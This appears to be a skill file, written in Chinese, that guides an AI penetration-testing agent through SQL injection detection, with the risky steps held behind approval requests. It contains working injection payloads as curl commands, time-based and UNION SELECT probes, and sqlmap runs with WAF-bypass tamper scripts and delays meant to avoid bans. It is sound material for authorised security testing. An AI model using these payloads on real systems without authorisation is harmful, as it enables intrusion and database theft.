---
name: sql_injection
description: "SQL 注入检测与验证。Use when: 目标使用关系型数据库 (MySQL/PostgreSQL/MSSQL/Oracle/SQLite) + 发现含参数的 URL/表单/API 端点"
allowed-tools:
  - execute
  - http_request
  - browser
  - create_candidate_finding
  - confirm_finding
  - reject_finding
  - request_approval
phase: scan
disable_model_invocation: false
---

# SQL 注入检测流程

## Step 1: 参数发现

从 recon 阶段的应用模型中提取所有含参数的端点。优先测试：
- URL 查询参数: `?id=1`, `?search=keyword`, `?category=books`
- POST JSON/Form 参数: `{"userId": 123}`, `username=admin`
- Cookie 值 (有时直接拼进 SQL)
- HTTP 头 (User-Agent, Referer — 常被日志记录后拼进 SQL)

## Step 2: 快速手工测试

对每个参数发送手工 payload，观察响应差异：

```bash
# 数字型参数 — 测试
curl -sk "https://TARGET/page.php?id=1'" -o /dev/null -w "%{http_code}"  # 单引号
curl -sk "https://TARGET/page.php?id=1 OR 1=1" -o /dev/null -w "%{http_code}"
curl -sk "https://TARGET/page.php?id=1 AND 1=2" -o /dev/null -w "%{http_code}"

# 字符串型参数 — 测试
curl -sk "https://TARGET/search?q=test' OR '1'='1" -o /dev/null -w "%{http_code}"
curl -sk "https://TARGET/search?q=test' AND '1'='2" -o /dev/null -w "%{http_code}"

# 检查响应差异 (使用 ResponseDiffEngine)
# - 状态码变化
# - 响应体大小显著变化 (>30%)
# - 数据库错误关键词泄露 (syntax error, mysql_fetch, ORA-, PostgreSQL, SQLite3, etc.)
```

## Step 3: 数据库类型识别

如果 Step 2 发现疑似注入，尝试识别数据库类型：

```bash
# MySQL
curl -sk "https://TARGET/page.php?id=1 AND 1=1-- -" 
curl -sk "https://TARGET/page.php?id=1 UNION SELECT 1,2,3-- -"

# PostgreSQL  
curl -sk "https://TARGET/page.php?id=1 UNION SELECT 1,2,3--"
curl -sk "https://TARGET/page.php?id=1 AND 1::int=1--"

# MSSQL
curl -sk "https://TARGET/page.php?id=1 UNION SELECT 1,2,3--"
curl -sk "https://TARGET/page.php?id=1 WAITFOR DELAY '00:00:05'--"  # 时间盲注

# Oracle
curl -sk "https://TARGET/page.php?id=1 UNION SELECT 1,2,3 FROM dual--"
```

## Step 4: sqlmap 自动化（需授权）

如果手工测试确认疑似注入点，且目标无 WAF 或已知绕过方法：

```
# 首先请求授权
request_approval(
  risk_level="intrusive",
  question="手工测试发现疑似 SQL 注入点，是否允许 sqlmap 自动化检测？",
  proposed_action=f"sqlmap -u 'TARGET_URL' --dbs --batch --risk=2 --level=3",
  target="TARGET_URL"
)
```

授权后执行：

```bash
# 基本检测 (risk=2, level=3)
sqlmap -u "TARGET_URL" --dbs --batch --risk=2 --level=3 \
  -o ${SKILL_DIR}/output/sqlmap-TIMESTAMP.txt \
  --random-agent --delay=1

# 如果有 WAF，添加 tamper 脚本
sqlmap -u "TARGET_URL" --tamper=space2comment,charencode,randomcase \
  --dbs --batch --risk=2 --level=3

# POST 请求
sqlmap -u "TARGET_URL" --data="PARAM=VALUE" --dbs --batch
```

## Step 5: 手工确认 + 影响评估

sqlmap 发现注入点后，需要手工确认（不能仅靠工具输出）：

```bash
# 确认数据库访问 — 需要 destructive 授权
request_approval(
  risk_level="destructive",
  question="sqlmap 确认了 SQL 注入点，是否允许手工验证数据库访问？",
  proposed_action="获取数据库名和表名来确认注入影响范围",
  target="TARGET_URL"
)

# 授权后手工确认
curl -sk "TARGET_URL?id=1 UNION SELECT 1,table_name,3 FROM information_schema.tables-- -"
```

## Step 6: 创建 Finding

确认后：

```
create_candidate_finding(
  title="SQL 注入 — /api/users 端点 id 参数",
  vuln_type="sql_injection",
  severity="high",
  affected_asset="TARGET_HOSTNAME",
  location="/api/users?id={injectable}",
  confidence=0.9,
  evidence_summary="手工单引号注入→数据库错误泄露(WARNING: mysql_fetch_assoc)→sqlmap确认注入点→手工UNION SELECT提取表名"
)
```

进入 verify 阶段进行独立复现和交叉验证。

## 注意事项

- **WAF 目标**: 先测试绕过 (大小写/编码/注释插入)，sqlmap 用 `--tamper` 脚本
- **速率限制**: sqlmap 加 `--delay=1` 或 `--delay=2` 避免触发 ban
- **POST/JSON**: sqlmap 对 JSON 支持有限，手工 curl 验证 POST JSON 参数
- **时间盲注**: 如果响应无差异但注入点存在→WAITFOR DELAY/BENCHMARK→时间盲注
- **不要直接运行 exploit**: `--os-shell`/`--os-cmd` 必须独立申请 destructive 授权
